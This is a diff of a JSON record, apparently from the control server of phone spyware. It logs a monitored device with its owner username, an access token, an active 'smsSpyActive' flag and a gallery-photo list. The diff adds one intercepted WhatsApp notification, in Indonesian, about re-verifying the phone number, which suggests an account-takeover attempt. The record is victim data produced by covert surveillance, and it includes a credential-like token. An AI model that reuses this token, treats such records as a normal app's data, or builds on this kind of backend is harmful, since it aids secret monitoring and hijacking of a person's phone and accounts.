@@ -4163,7 +4163,7 @@
     "deviceName": "HP-AMBON19-0D5B",
     "ownerUsername": "gehgtg17",
     "token": "b36a601bee97c135ded0a2cfdb727a64",
-    "lastSeen": 1776047030157,
+    "lastSeen": 1776047057464,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-12T23:23:36.743Z",
@@ -4184,7 +4184,16 @@
       "capturedAt": 1776044492490
     },
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Anda kini bisa mencoba memverifikasi ulang nomor telepon. Ketuk di sini atau buka WhatsApp untuk memverifikasi.",
+        "time": "13/04 09:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776047058567
+      }
+    ],
     "galleryPhotos": [
       {
         "id": "52400",
